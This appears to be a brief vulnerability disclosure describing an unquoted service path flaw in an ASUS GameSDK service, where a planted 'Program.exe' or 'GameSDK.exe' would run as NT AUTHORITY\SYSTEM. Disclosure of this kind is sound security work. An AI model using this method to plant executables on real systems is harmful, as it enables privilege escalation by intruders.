# Exploit
If an attacker had already compromised the system and the current user has the privileges to write in the "C:\Program Files (x86)\ASUS\" folder or in "C:\" , he could place his own "Program.exe" or "GameSDK.exe" files respectively, and when the service starts, it would launch the malicious file, rather than the original "GameSDK.exe".

# Impact
An attacker can elevate his privileges on the system and become NTAUTHORITY\SYSTEM.
